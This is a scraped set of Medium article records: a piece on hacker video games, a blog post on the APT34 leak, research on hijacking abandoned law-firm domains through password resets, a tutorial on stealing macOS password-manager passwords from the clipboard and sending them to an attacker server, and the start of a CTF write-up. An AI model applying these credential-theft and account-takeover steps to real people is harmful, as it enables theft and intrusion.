","['About', 'Help', 'Go Home', 'Chinese', 'Portuguese', 'Spanish.', 'Pomodoro Technique', 'Manning', 'NoStarch', 'Sybex', 'Syngress', 'AdSecurity.org', 'DSInternals.com', 'Hackipedia', 'HighOn.Coffee', 'JustHackerThings', 'NetSparker SQLi', 'Sakurity Oauth', 'Offensive CounterIntelligence', 'OWASP', 'PentestMonkey', 'PwnWiki.io', 'Pentest.guru', 'Sans Cheatsheets', 'SQLInjectionWiki', 'etc.', 'Binary-Auditing', 'Challenges.re', 'CrackMes.de', 'Corelan.be', 'Exploit-Exercises', 'Flaws.cloud', 'FuzzySecurity', 'Hack.me', 'HackSplaining', 'MCIR', 'Metasploitable3', 'MicroCorruption', 'Mutillidae', 'Security Shephard', 'VulnHub', 'WebGoat', 'WebSecurityDojo', 'QueQuero', 'etc.', 'Alpine', 'BlackArch', 'BackBox', 'Bugtraq', 'Kali', 'LionSec', 'Mercenary', 'REMnux', 'RITA', 'Santoku', 'SecurityOnion', 'SIFT', 'Whonix', '@da_667', 'OPNsense.', 'Install Kali', 'configuration script.', 'Microsoft', 'ASIS International', 'HITRUST', 'Vulnerabilities', 'Testing Process', 'FAQ', 'Guidelines', 'Cheatsheet', 'Guides', 'Code Review', 'Cybrary.it', 'HackAllTheThings!', 'MOOC-list', 'OpenLearning', 'OpenSecurityTraining.info', 'ProfessorMesser.com', 'RPISEC', 'SecurityTube.net', 'CyberTraining365', 'INE', 'InfiniteSkills', 'IPExpert', 'GIAC SANS', 'OpSecX', 'PentesterAcademy', 'PluralSight', 'SecurityTube Training', 'CyberDegrees', 'HackEducate', 'OnlineEducation', 'Hacking', 'Cybersecurity', 'Career Advice', 'Security Certifications', 'Infosec']"
Hacker Video Games Are Experiencing a Renaissance - OneZero,https://onezero.medium.com/hacker-video-games-are-experiencing-a-renaissance-eac333cf1ea2?source=tag_archive---------8-----------------------,"Dave Kennedy once broke into a bank vault with a password he found in a worker’s desk drawer. The desk was locked, but picking it was trivial, and it took about 30 seconds to get the code that would give him access to safety deposit boxes and bags of cash. “Unfortunately,” he laughs now, “we had to give it back.”
Kennedy is a security consultant and co-founder of the cybersecurity firms Binary Defense, which defends against hackers, and TrustedSec, which simulates their attacks. “We get to be simulated bad folks but we don’t have to go to prison,” he says. “Which is awesome.”
Given the enjoyment he finds in playing at someone he’s not, it’s not surprising that Kennedy, now 36, is a lifelong video-game player. As a kid, he learned how to code so that he could run his own text-based online multiplayer game known as a Multi-User Dungeon, which later helped him get his first job in cybersecurity for the Marines. Kennedy thinks that video games could help people develop skills needed to meet the growing demand in the cybersecurity industry, especially now that so many games are designed to make the player feel like a hacker themselves.
The term “hacking” used to just mean exploring and understanding systems more deeply. But around the 1980s, the mainstream media began to use it to signal malicious intent: unauthorized intrusion through manipulation and exploitation of technology and, as with Kennedy’s bank vault, the people who use it. Hollywood took this definition and ran with it. The hackers of 1980s and ’90s movies were meddling kids going places they shouldn’t, like 1983’s WarGames, in which a teenage Matthew Broderick accidentally gains access to a military supercomputer and almost starts a nuclear war.
Video games have a long history of looking to Hollywood. Just two years after the release of WarGames, Activision CEO Jim Levy demonstrated their new game Hacker to journalists in 1985 by pretending his attempts to access the company server had accidentally led him to an unknown computer system. Movies were sometimes inspired in turn by games: in the 1995 movie Hackers, Dade and Kate (played by Jonny Lee Miller and Angelina Jolie) compete on a beta version of the futuristic racing game Wipeout.
“Cybersecurity now, in real life, is a lot more like movies from the 90s, in that it’s governments and mysteries and conspiracies.”
At the turn of the millennium, a group of computer science students at Imperial College London who had spent their young lives watching these movies founded an independent game development company called Introversion. They created a bestselling hacking game that many players and developers cite as the pinnacle of the genre. Uplink, released in 2001, is packed with references to pop culture and real events, like the 1990 raid of Steve Jackson Games by the U.S. Secret Service, which believed the company possessed materials involved in criminal activity. (In addition to protecting high-level government officials, the Secret Service is also charged with investigating cybercrimes.) One in-game server copied from WarGames can only be accessed with a password from the movie.
“Everything you’ve ever seen in a video game about hacking is inspired by movies,” says American game developer Zach Barth. His company Zachtronics is known for complex, open-ended puzzle games, and their latest is the 2018 hacking-themed Exapunks, which he likes to describe as Hackers fanfiction. Barth theorizes that a 20-year cycle of nostalgia may explain the renewed interest in hacking as portrayed in ’80s and ’90s movies, though it may also be their apparent prescience. “Cybersecurity now, in real life, is a lot more like movies from the 90s, in that it’s governments and mysteries and conspiracies,” says Barth.
Hacking is big in current pop culture. Kennedy has advised on the award-winning television show Mr. Robot, and even appeared in a 2017 music video for Zoey Dollaz’ Post and Delete, for which he wrote a legitimate exploit, a piece of software that takes advantage of a vulnerability on a computer.
But while those are set in the modern day, games often look backward. Exapunks is set in 1997 and has a sense of historical authenticity, with printable hacking zines that teach you how to play and lingo from the 1996 Wired style guide. Uplink, which asks the player to create an account to access a bulletin board of freelance hacking gigs, looked so convincing that reviewers at PC Gamer unplugged their office network in case it turned out to be some malicious virus.
When it comes to what the player actually does, Uplink’s developer Chris Delay says the game comes before realism. Inspired by all those movies, he implemented a countdown timer. Players who fail to cover their tracks get a permanent game over. “It’s all about the paranoia,” he says. “If you don’t have that then you’re not experiencing this criminal life properly.”
Movies and games add these embellishments for the sake of excitement. Katie Goode and John Campbell, co-founders of U.K. independent game developer Triangular Pixels, live down the road from GCHQ, the headquarters of the British secret service in Bude, England. “You’ve got people around town that are everyday spies,” says Goode, “And they’re just totally normal people.”
In their BAFTA-nominated virtual-reality infiltration game Unseen Diplomacy (2016), hacking is based on a particularly unrealistic episode of NCIS, in which a man tries to help a woman to thwart a hack by typing on the same keyboard at the same time. Goode and Campbell mimicked this frantic typing effect by requiring the player to run between three keyboards and mash the keys.
Brendon Chung, who runs the one-person Californian independent game developer Blendo Games, also exaggerated the action in his award-winning 2016 Quadrilateral Cowboy. The player controls three female hackers for hire in an alternate-reality 1980s world of clunky technology, and the main tool is a portable computer known as a hacking deck. “One of the trickier parts of doing hacking games is that the stuff you do is very intangible,” he says. “So I wanted to push it more toward the analog part of the spectrum.”
These games all want to help the player achieve a sense of mastery. Chung compares hacking to Harry Potter, using a magical secret language to talk to computers. Beglitched, a 2016 game from independent developers AP Thomson and Jenny Jiao Hsia, goes so far as to call its hacker a computer witch.
Swedish independent game developer Erik Svedäng thinks games could encourage people to learn these secret languages. In his 2015 game else Heart.Break(), a coming-of-age adventure in which boy meets girl and girl turns out to be a hacker fighting an oppressive government, players can hack objects using a programming language that Svedäng based on existing ones. “The hard part was to make it an easy language for people to use,” he admits. But he thinks that those who do get to grips with his language could go on to learn to code for real.
It’s clear that hacking games aren’t going anywhere, and while some are nostalgic, others — like else Heart.Break() — are tackling current concerns. A Normal Lost Phone and Another Lost Phone: Laura’s Story, both 2017 games from French independent developer Accidental Queens, simulate smartphones, with password-protected apps, documents, and photos for the player to dig through for information. The big-budget hacking-themed action-adventure games Watch Dogs and Watch Dogs 2, released in 2014 and 2016, center on a system of mass surveillance in U.S. cities. The next installment is rumored to be set in London — which would be timely, given that U.K. police forces have been trying out facial recognition technology.
And if any developer wants to add some extra authenticity to their next game, and perhaps even teach players something about cybersecurity, Kennedy is willing to lend a hand: “Any video game company out there that wants a real-life hacker, let me know.”
This piece has been corrected to state that Triangular Pixels is close to GCHQ in Bude, not Cheltenham.
Written by
","['CONSUMER TECH', 'DIGITAL LIFE', 'INDUSTRY', 'SCIENCE & MEDICINE', 'ABOUT', 'Gaming', 'Cybersecurity', 'Tech', 'Digital Life', 'Hacker']"
Hacking (Back) and Influence Operations - Just another infosec blog type of thing,https://blog.0day.rocks/hacking-back-and-influence-operations-85cd52c1e933?source=tag_archive---------6-----------------------,"We all are collateral victims of very famous information operations, also known as influence operations. In the cyber realm they take full power: stealing information (via hacking or other means) is already a full time job, and disseminating that information through the press or social networks to fit a narrative is generally the easy part.
For example the Shadow Brokers leaks could be categorized as an IO (Information Operation), disrupting the NSA and the US intelligence agencies while making them appear weak and evil-minded (see the WannaCry aftermath and how the NSA has been held accountable for it). And it’s not the first time leaking is related to hacking: Guccifer 2.0 was an IO as well, now widely acknowledged to be part of a Russian Intelligence disinformation campaign.
There are plenty other examples of these “hack & publish” operations, such as the Macron Leaks, this time released through Wikileaks. It was later suspected that Russia was involved.
Hacking, bots, media amplification, disinformation: the new convergence of disinformation tactics and CNE
According to the US doctrine:
The Secretary of Defense characterizes IO (Information Operations) as the integrated employment, during military operations, of information-related capabilities in concert with other lines of operation to influence, disrupt, corrupt, or usurp the decision making of adversaries and potential adversaries while protecting our own.
Source: Joint Publication 3–13
But would you believe other countries are doing the exact same thing?
On March 18th 2019 I was contacted by a mysterious Mr_L4nnist3r, brand new Twitter account, that explicitly wanted to leak information regarding APT34, a hacking group believed to be originating from the MOIS, the Ministry of Intelligence of Iran also known as VAJA (وِزارَتِ اِطّلاعات جُمهوریِ اِسلامیِ ایران Vezarat-e Ettela’at Jomhuri-ye Eslami-ye Iran). This Mr_L4nnist3r said he was a former developer for APT34, he wanted money but most of all he seemingly wanted to leak the data, even for free. Odd, but why not?
The files contain screenshots of the tools used, a target list and an archive with the BONDUPDATER malware source code (a Node.JS server acting as the C2 and the Powershell payload). At this point it is clear that the files are genuine, coming from the APT34 hacking team, and most likely from operators or at least some sort of internal infrastructure (similar to what the Shadow Brokers published). More technical details can be found on Misterch0c’s blog.
Now why would a former developer working for the Iranian government would want to publish such documents? He was apparently selling the data a few days later on some hacking forum, but somehow never mentioned a price to me, even if he said he wanted money. Intriguing. Also Mr_L4nnist3r claimed to be responsible for DNSpionage, a cyberattack campaign attributed to Iran.
The files are clearly related to hacking activities, mentioning internal servers of targets, webshell URLs and such. Only what a threat actor could harvest. Which means that either Mr_L4nnist3r is a former operator from APT34, or that APT34 (the MOIS) has been breached by a third party. This is also known as fourth-party collection (see this whitepaper by Juan Andres Guerrero-Saade & Costin Raiu):
Fourth-party collection involves interception of a foreign intelligence service’s ‘computer network exploitation’ (CNE) activity in a variety of possible configurations. Given the nature of Agency-A as a cyber-capable SIGINT entity, two modes of fourth-party collection are available to it: passive and active. […]
I personally believe this leak is being orchestrated by an outside party. He claimed to have been employed because of his “cyber knowledge”, but wasn’t aware of the Shadow Brokers when I mentioned it, which is really odd for someone apparently doing the same thing.
When confronted about his motivations, he was pretty vague and only wished to publish in order to “fuck the MOIS”. Well, that’s not really a strong stance for someone allegedly risking its life in Iran, you would at least be a little more passionate about your goal here. If you’re ready to die or get thrown into jail for a cause, you would at least write a manifesto or be a little bit more convincing than “fuck the government”. If he was a former APT34 member, the MOIS would know his name and they have the capability to execute people outside their territory, he wouldn’t be safe anywhere. Yet, Mr_L4nnist3r is available for a chat on Twitter and Jabber like nothing could happen to him. This story is just implausible.
Also, the documents leaked are relatively scarce (meticulously selected?), I believe a developer or operator from APT34 would have accessed much more valuable information. Why not leaking the whole infrastructure? Why dropping documents without any context to it? Where are all the fun details? We’ve seen the Project Raven investigation uncovering the hacking efforts of UAE and what a former operator/analyst could describe. From the process of targeting people and how an operation is carried away down to the physical description of the offices. This is what is missing here to make it an authentic “internal” whistleblower. And why I don’t believe this story — as it is being fed to the media.
Well, who would want to hurt Iranian offensive capabilities the most? Probably a lot of countries, Israel and the US at the top. Given the regional landscape and the current state of affairs, its neighboring countries are also good candidates. APT34 being particularly active in the Middle East, where it is reported to be targeting Middle Eastern governmental agencies. This could very well be a counter-operation to the Iranian CNE efforts from one of its retaliating victims. Is this when Hack Back meets Information Warfare?
Considering the current media attention towards Saudi Arabia (notably the use of NSO hacking products in the Khashoggi case), it would make sense to think they could have done something to 1) shift media coverage against Iranian hacking activities and 2) disrupt current APT34 operations known to target Saudi Arabia and its regional allies. But then again, who knows?
So far, this doesn’t appear to be as damaging to what the Shadow Brokers has done but all things considered I’m pretty sure it succeeded in disrupting the CNE efforts of the Iranian intelligence services. Shifting the media attention to Iran? Not there yet, very few documents in the dataset, and journalistically not that interesting to cover. Although ZDnet and others covered the leak :
But Catalin Cimpanu correctly warns the reader :
In our Twitter conversation, the leaker claimed to have worked on the group’s DNSpionage campaign, but this should be taken with a grain of salt, as the leaker could very well be a member of a foreign intelligence agency trying to hide their real identity while giving more credence to the authenticity of Iran’s hacking tools and operations.
Interestingly, our gut feelings tell us there’s something fishy going on with the leaker, something simply doesn’t add up.
I think there’s something missing for that leak to be originating from Iran, especially if the motive is political. Of course all of this is still a mystery and will probably stay that way. This is why these information operations are damn effective and generally hard to formally trace : plausible deniability and the lack of available information to debunk a story.
This may seem a bit counterintuitive but this is disinformation, even if the documents are genuine. I couldn’t phrase it more accurately than the grugq :
We are only being served one side of the story, which happen to benefit one side only.
I wrote this short article in the hope to give the reader some food for thought. Maybe the leaks are genuinely originating from Iran, maybe not. Critical thinking is highly needed and I wanted to share my reflections on the topic, as well as enlightening and new elements from my discussion with the leaker.
Written by
","['Cybersecurity', 'Influence', 'Middle East', 'Iran', 'Hacking']"
Hacking law firms with abandoned domain names - Gabor Szathmari - Medium,https://medium.com/@gszathmari/hacking-law-firms-abandoned-domain-name-attack-560979e0b774?source=tag_archive---------7-----------------------,"Email is an essential service for all businesses, including legal practices. Email is not only a primary communication channel but also required for registering with online services and profession-specific portals. When law firms merge or wind-up, internet domain names are often abandoned, allowing anyone to re-register and take ownership of the former firm’s domain name. The new owner can then, among other things take control of the former firm’s email services. This research report demonstrates how domain name abandonment attacks pose a significant cyber threat to the legal profession and other businesses. This report also makes recommendations as to measures legal practices and other businesses can take to stop this threat.
Update (18/09/2018): Read the high-level summary of this research on Iron Bastion’s security blog.
Update (12/09/2018): Our slides from SecTalks Sydney are available here.
Domain name abandonment allows cybercriminals to gain access to, or reset passwords for online services and profession-specific portals. These online services store documents, emails and other information relating to a legal practice, including financial details, personal information, confidential information and client-legal privileged information.
The goal of this research is to raise awareness of a common practice in the legal profession, and in other business of allowing domain names to expire after mergers and acquisitions. We give practical tips at the conclusion of this report on how legal practices and technology providers can defend legal practices and other businesses from domain name abandonment attacks.
Email is an essential service in every business, and the effect of a company losing control over their email service is devastating, even if the company has merged or shut down. Sensitive information and documents are often exchanged over emails between clients, colleagues, vendors and service providers due to the convenience. Consequently, if a bad actor takes control of an entire business’s email service, sensitive information can end up in wrong hands.
Email besides being used for communication is commonly required for signing up for online services. People often change jobs and end up with multiple user accounts on these services, with the old user accounts often abandoned. Online services usually rely on a single factor to reset passwords, i.e. only an email address is required to regain access if the password is forgotten. Consequently, whoever has control over the domain and able to set up a basic email service can capture password reset emails.
In short, bad actors can re-register an abandoned domain of a business and take full control of email services configuring it to:
Once someone stops paying for an internet domain name, the registration status of the domain goes through various stages before it gets deleted. Once the final grace period ends, the internet domain name is abandoned. In other words, the domain name of the former business becomes available for anyone to re-register, with no additional identity or ownership verification required. Domain registration of abandoned domains is a well-known technique amongst SEO professionals and spam trap operators, but not so well-known to cybersecurity professionals as a security risk.
On any given day, an average of about a thousand ‘.au’ domain names expire. The ‘.au’ being the country code Top Level Domain (ccTLD) for Australia. The list of expiring internet domain names is public and published on a daily basis in a simple CSV file format. This list allows you to watch for valuable domain names due to expire and register them once the domain name registrar drops them.
All you need to do is monitor the public list for domain names featuring relevant keywords you are interested in such as ‘law’ or ‘legal’, and register them again with your preferred domain registrar.
Once the domain registration is complete, you can specify (by changing the MX records of the domain) how the incoming emails should be handled. Having ownership of the domain name means you have full control over the incoming email flow of the former business.
By setting up a simple catch-all email service, you can:
Having working access to an email address is powerful because a password reset allows you to regain access to a myriad of services originally belonging to the former business and its staff.
For example:
Legal practices are established and wound-up just like any other business entity on a regular basis. What makes legal practices unique is that they frequently merge with each other or are acquired by another entity and this often coincides with a name or brand change.
In the US, 2017 was a record year for top-tier law firm mergers with 102 mergers or acquisitions in the year. At the small legal practice level, the number is likely to be in the thousands.
What happens after a merger or acquisition is that one entity may drop its branding in favour of the other firm, or a new brand is created for the firm. Consequently, the internet domain names of the old businesses are often left to expire in the process.
On a broader scale, two out of three small businesses cease operating within the first three years of starting according to the Australian Bureau of Statistics (ABS). This means that the domain name of many of these failed businesses is abandoned as well.
Legal professionals also rely on emails to communicate with clients, while the staff uses their business email address to register to profession-specific legal services such as online court registries (e.g. Commonwealth Courts Portal) and other online services like Dropbox.
As part of this research, we identified a handful of abandoned domain names formerly belonging to legal practices and re-registered those domains with the intention of reinstating the email service. We set up a catch-all email server and waited for the incoming emails.
By taking full control over previously abandoned domain names, we can demonstrate that we were able to:
Also, we could have:
For this research, we hand-picked and re-registered domain names formerly belonging to legal practices in Australia. Once these domains were registered, we set up our private email server to receive emails addressed to the former legal practices.
Once the email server was ready to go, we:
In the following sections, we are detailing what we managed to get access to and how we did it.
From the incoming emails we received, we noticed many online services send their users newsletters, reports, statements and notifications with confidential information.
We have found that NAB, Commonwealth Bank and Bankwest are popular banking services amongst legal practitioners in Australia:
Business debit cards often remain active even after the business has dissolved:
Travel arrangements are made on behalf of the former law firm:
Legal professionals usually add their work email addresses to their current LinkedIn profile. Although because people tend to forget removing these abandoned email addresses from their profile, we keep receiving email notifications from LinkedIn:
Former firms keep getting BAS notifications either for former clients or their former businesses:
Invoices sent to the legal practice can reveal which suppliers they use, the following invoice is for a legal archive storage service.
We received legal documents relating to family law matters:
Also, invoices from other law firms for work performed on behalf of the firm:
We received transcripts of court proceedings:
These incoming emails let us peek into the internal workings of a law practice:
We received emails from former clients seeking advice:
Legal practitioners on the opposing sides of matters often voluntarily exposed information to us sending correspondence to the former law firm’s email address as an additional cc:
This other case involves a joint bank account closure:
This document details the negotiation strategy of a settlement:
Uber is the preferred choice of travel amongst legal practitioners:
They order things from Amazon:
Lawyers tend to use lots of mobile data (bonus for the emails revealing the active phone numbers of former staff):
Text-to-email services leak text messages of personal nature:
Ironically, they receive invitations to cybersecurity events:
Finally, lawyers know how to party:
In addition to setting up a catch-all email address, we took proactive steps to get to know our new domains better by registering to data breach notification websites. In doing so, we were able to reveal passwords belonging to legal professionals and staff at the former firms.
According to a recent study, over 80% of people online are guilty of reusing their passwords on multiple cloud services. Passwords are often leaked to the internet when data breaches happen. There are over 1.7 billion hacked credentials from data breaches such as LinkedIn, Netflix and Adobe. If a legal practitioner is reusing the same password across several websites (such as their work or personal mailbox) as in the breach data, a hacker could log into their email service with the same password.
On Haveibeenpwned and SpyCloud, email and domain name owners can check if they have an account that has been compromised in a data breach. It usually means that passwords from online services have ended up on the internet for everyone to see.
With the combination of the Haveibeenpwned Domain Search and the SpyCloud service, we were able to retrieve former legal practice email addresses and passwords leaked by past data breaches. Both of these services required us to verify the domain ownership before they provided access to the breach data information, but because we had full control over the domain names, we could easily pass this domain ownership verification process.
At Haveibeenpwned, we simply requested the confirmation email topostmaster@domainname.com.au to complete the verification process.
Once the verification was complete, we could retrieve the list of email addresses that were involved in any past data breaches.
The verification process at SpyCloud was similar, all we had to do was click on a link in a domain ownership verification email. As opposed to Haveibeenpwned, however, this service exposes the actual passwords of the former employees, not just whether they were involved in a data breach.
Without publishing the actual passwords as part of this research, we can reveal that legal professionals (in our non-representative sample of thirty-something individuals) are:
Because legal professionals tend to reuse their favourite passwords, it is likely that they chose the same favourite password on:
By having the list of valid email addresses taken from Haveibeenpwned, we can demonstrate how we could have taken control over the current personal and work-related user accounts of former staff.
For example, practitioners tend to feature their former work email address on LinkedIn. Perhaps it is a little-known fact that everyone can request passwords reset emails to any of the email addresses added to the account.
Because email addresses associated with the abandoned domain names rarely get removed from the practitioners’ LinkedIn account, we can request password reset emails to the domain under our control. All we need to do is go through the LinkedIn Password Reset process and click on the link in the email to hijack the practitioner’s LinkedIn account.
The following legal practitioner with a very active LinkedIn account was a partner at the former legal firm:
The first step is to visit the ‘Forgot password?’ page linked from the login page:
Next, we enter the practitioner’s abandoned business email address:
Then we receive the password reset email:
The same concept applies to Facebook as well. Certain practitioners also added their former work email address to their Facebook account and forgot to remove them. This practice allows us again to reset the password on Facebook, too.
The following solicitor owns a quite active Facebook page:
Let’s find out if we can reset this solicitor’s password with the ‘Forgotten account?’ feature:
The password reset email arrives as expected:
We could just use the embedded link then or provide the six-digit reset code on the website to complete the account takeover:
Twitter is no exception either. We found Twitter accounts registered under someone’s former email address under the abandoned domain, making Twitter accounts susceptible to password resets.
We use the forgotten password feature again:
The link in the email would allow us to reset the password of the Twitter account and let us in:
Personal Twitter accounts are not safe, either, as certain practitioners used their work email address to register on Twitter and never changed it:
Legal practitioners rely on free services like Dropbox for storing and sharing work-related files. This Dropbox account seems to be full per the notification email which landed in our mailbox:
Let’s see if we could reset the password on it! (spoilers: yes, it would)
The hijacked email addresses also allow us to reset the password of the Commonwealth Courts Portal. The Commonwealth Courts Portal provides web-based registry services for legal professionals to file documents for litigation process for the Federal Court. A user account here could give us access to sensitive documents and details of former clients.
Although the portal requires a username and password combination to log in, we can retrieve the username by entering our email address:
We can use the forgotten password feature by keying in the username from the email and the very same email address.
The portal assigns us a temporary password, which would let us log in then:
We can also reset passwords on the NSW Online Registry portal, too. The Online Registry portal provides similar services to the Commonwealth Courts Portal, but for state courts such as the NSW Supreme, District and Local Courts.
We use the forgotten password feature again to get access:
Once we clicked on the password reset link from the email, we did not attempt to proceed past the security questions. However, as Google pointed out earlier, security questions are insecure. The adventurous may want to search for these details in public records. For example, we were able to track down this particular lawyer’s older brother on Facebook, whose birth date is probably available on the platform.
The LEAP Practice Management Platform is not safe, either. LEAP practice management software and is the most commonly used software for managing a legal practice. The platform contains online client files, legal documents and has integrated trust accounting and time billing.
We click on the ‘Forgotten password?’ link again and enter one of the legal practitioner’s former work email address:
A few seconds later, we managed to receive the following email:
Although LEAP is boasting how secure their platform is, the password reset email features the cleartext password, meaning that the company is not storing their customers’ passwords in a secure hashed format.
Finally, Law Society accounts are not safe from password reset attacks, either:
Certain firms had registered on PayPal with their work email as a method of receiving payments from clients:
This particular firm had an AdWords account at Google. If we were wondering what keywords this firm was using on AdWords? We could have reset the password to find that out.
Based on our experience, the two most popular email platforms amongst law firms are Office 365 followed by Google G Suite. These cloud-based email services are often abandoned leaving online data intact, rather than the accounts closed. To make things worse, legal professionals tend to retain their emails forever, making those mailboxes fairly valuable to potential fraudsters operating Business Email Compromise (BEC) fraud.
Based on the historical DNS records, we found that one of the law firms relied on Office 365 and G Suite for hosting email services. This made us think: could we hijack the account and access the inboxes of the former practice?
First, we tried and failed to reset the password on Office 365 as two-factor authentication was enabled, which stopped us from completing the password reset.
We had more luck with G Suite. First, we tried and failed to reset the password with the former G Suite administrator’s email account:
Then we tried to reset the G Suite administrator’s account by using the internal email address that Google assigns to every subscriber.
We stopped at this last step and decided to not complete the password reset process on G Suite:
As for all other services, we did not complete the final step of the password resets for privacy reasons meaning we did not log into or take over the user accounts, or access any information stored in online services, although we could have.
Businesses, especially legal practices leave themselves exposed to cyber attacks by allowing their former domain names expire. Bad actors can acquire these abandoned domain names and reinstate the former business’s email service.
This research demonstrates that abandoned domain names allow new domain owners to access financial, personal, confidential and privileged information of the former owner. In addition, attacks can gain access to email addresses and passwords from past data breaches, and take over online services. If we were a bad actor, we could have used the domain to commit fraud by numerous methods as well as reinstating the former website of the law firm and posing as former staff.
To prevent this from happening to your business, we recommend you:
We recommend that LEAP review the password storage practices of their practice management software and apply the latest password hashing security practices. Online court portals and other professional-specific websites should implement two-factor authentication for logins and strict controls for password resets.
We also suggest the Australian law societies consider taking over the domain names when a legal practice is wound-up. As far as we know, law societies in Australia have the power to appoint an administrator to take over a legal practice when it is closed to take care of client files and distribute any funds left in the trust account. Law societies could take over the domain name and hold onto that for an extended period rather than letting them expire. The law societies should set up a website with a simple notice (like the FBI does on seized domain names) advising the visitors that the law firm is closed and reply to emails with an automated message.
During the three month period of this research, we:
Gabor Szathmari is a cybersecurity expert with over ten years experience, having worked in both private and public sectors. He has helped numerous big-name clients with data breach investigations and security incident management. In his professional life, Gabor helps businesses, including many small and mid-size legal practices, with their cybersecurity challenges at Iron Bastion — Australia’s anti-phishing experts.
Jeremiah Cruz is a Networking Associate and UTS Graduate. He helps kids learn to code and communicates complex ideas through stories and practical lessons building what he most loves: Games.
Originally published at blog.gaborszathmari.me on August 21, 2018.
Written by
","['Security', 'Hacking', 'Cybersecurity', 'Legaltech', 'Lawyers']"
"Hacking macOS: How to Dump 1Password, KeePassX & LastPass Passwords in Plaintext",https://medium.com/@NullByteWht/hacking-macos-how-to-dump-1password-keepassx-lastpass-passwords-in-plaintext-723c5b1c311b?source=tag_archive---------7-----------------------,"KeePassX, 1Password, and LastPass are effective against keyloggers, phishing, and database breaches, but passwords managers rely on the operating system’s clipboard to securely move credentials from the password vault to the web browser. It’s within these few seconds that an attacker can dump the clipboard contents and exfiltrate passwords.
Two scenarios come to mind with a clipboard-dumping attack geared toward password managers, and both utilize the pbpaste command found in all versions of macOS. Pbpaste will take any data found in the clipboard (including passwords) and write it to the standard output. Any macOS user can try this by first copying a password to the clipboard then immediately typing pbpaste into a terminal.
It doesn’t require special privileges to execute pbpaste, and the clipboard can be written to any file, as shown below.
Scenario: The attacker has established a persistent backdoor and wants to gather passwords stored in KeePassX, 1Password, or LastPass over a prolonged period. MacOS has become better about protecting against keyloggers, and anyone livestreaming the desktop couldn’t unhide or reveal credentials stored in the password managers.
The attacker can dump the clipboard into a local file and occasionally check it for new passwords. An infinite while loop with a five second delay should do the trick.
The while loop will execute pbpaste and pause (sleep) for five seconds. The command within the loop will repeat over and over again, repeatedly dumping anything found in the clipboard. An echo has been introduced to create a newline (\n) with every entry to prevent data from concatenating on the same line.
From an additional Netcat shell, use cat or to view the clipboard.txt file contents.
Tail will follow (-f) changes appended to the file and immediately print new content discovered in the clipboard.
Prevent the clipboard.txt file from flooding with duplicate lines by evaluating the clipboard contents and comparing it to the last entry in the file.
Only if the current clipboard content is not equal (!=) to the last entry ( tail -n1) in clipboard.txt will pbpaste update the file.
However, this solution is somewhat flawed. The if statement only compares the last line of the clipboard.txt file, so if there are multiple lines in the clipboard it’ll fail to recognize it as a duplicate entry. But it serves its purpose for this article and most scenarios. You can spend a little time devising a robust, proper solution with this as the basic foundation.
Scenario: The attacker doesn’t care to remotely access the MacBook. The payload is instead designed to exfiltrate the clipboard to the attacker’s server at intervals.
In this scenario, the attacker only cares about exfiltrating the clipboard and hasn’t backdoored the MacBook. Instead, they have found a way to remotely execute code on the target macOS device. Setting up this attack involves a PHP server controlled by the attacker used to intercept exfiltrated data. A Debian virtual private server is used in my example.
To get started, install php with the following command, which will work in Debian and Kali Linux.
Make a directory called “phpServer/” using the below mkdir command.
Change into the phpServer/ directory using the cd command.
Create a file called “index.php” with nano.
Paste the below PHP code into the nano terminal. Once that’s done, to save and exit the nano terminal, press Ctrl+ x, then y, then Enter.
This simple PHP server is capable of intercepting data and doesn’t need to be modified in any way to function. When the MacBook sends the clipboard contents, the server will capture and append the data to a file called “clipboard.txt.”
Finally, start the PHP server with the php -S 0.0.0.0:80 command.
The below script will compare the current clipboard contents to the most recent sent to the attacker’s server. For clarity, it’s in standard shell script format to allow space for comments.
Compress the script into one line to have it fit conveniently into various types of stagers.
As the PHP server receives clipboard data, it will indicate the origin of the data (IP address) as well as the date and time. Press Ctrl+ c to stop the PHP server.
View the clipboard.txt contents with cat to find the encoded passwords. KeePassX and 1Password automatically clear the clipboard after ten and thirty seconds, respectively. LastPass states it clears the clipboard “after a default amount of time.” Empty deliveries from the MacBook appear as “Cg==” encoded.
The following command will automatically decode all of the base64 strings in the clipboard.txt file. All of the below strings are passwords captured while using KeePassX, 1Password, and LastPass.
Penetration testers are encouraged to utilize as many resources already present in the compromised operating system (i.e., “ living off the land”). Like cURL, Netcat, Bash, and LibreSSL, pbpaste is yet another built-in tool easily abused by a hacker during post-exploitation engagements.
Attackers will explore every avenue to discover a target’s login passwords. Pbpaste makes dumping credentials stored in password managers almost too easy.
To prevent an attacker from having an opportunity to dump the clipboard, install the official 1Password browser extension or LastPass browser extension. They are available for all modern web browsers. For KeePassX users, similar browser extensions exist, but none have been officially audited or tested.
For 1Password, once the extension is installed, enable the “ 1Password Extension Helper” when prompted. Then, the helper would allow 1Password to autofill credentials while logging into websites. Autofill does not use the clipboard at all, therefore preventing a clipboard attack. The process is similar for the LastPass extension.
Keep in mind that neither work 100% of the time. Sometimes, it’s necessary to copy passwords to the clipboard when autofill on a website does not work.
If you must copy a password, you can adjust the clipboard settings for the password manager. For instance, you can go open 1Password’s preferences, select “Security,” then enter a time in seconds by “Clear clipboard contents after.” Make it as short as can be. In the hacks above, we used five-second intervals, so three or four seconds may be useful, but that doesn’t mean a hacker won’t be able to grab a password if it checks the clipboard at the right moment or if the time interval is decreased.
Overall, there is no built-in way to clear the clipboard on macOS after a set amount of time or as soon as an item is pasted, nor would it be advisable since the clipboard is used for more than just passwords.
You could build a Service for “Clear Clipboard” and assign it a keyboard shortcut like Command + Down Arrow. Then, you can manually clear the clipboard after pasting a password, so it’s not sitting in there longer than necessary. Just build the Service with Automator, but use the following as the “Run Shell Script.” However, you’d run into the same problem as described above about the clipboard being exfiltrated at the right moment or with a smaller interval before checks.
If you enjoyed this article, follow me on Twitter @tokyoneon_. For questions and concerns, leave a comment or message me on Twitter.
Don’t Miss: Create a Fake PDF Trojan with AppleScript
Cover photo and screenshots by tokyoneon/Null Byte
Originally published at https://null-byte.wonderhowto.com on June 10, 2019.
Written by
","['Security', 'Cybersecurity', 'Programming', 'Passwords', 'Technology']"
Hacking the Hard Way at the DerbyCon CTF - Signal Sciences Labs - Medium,https://medium.com/signal-sciences-labs/hacking-the-hard-way-at-the-derbycon-ctf-d35b4dd4c97d?source=tag_archive---------5-----------------------,"DerbyCon in Louisville is one of those conferences that you have to go back to every year. While the conference hosts a ton of great talks, the tradition for myself and several friends is to participate in the capture the flag (CTF) competition.
This year’s CTF did not disappoint, and we finished within the top 10 and had a great time. In this post I’ll want to talk about one particular challenge from the CTF that required bypassing input filtering in order to perform PHP code injection.
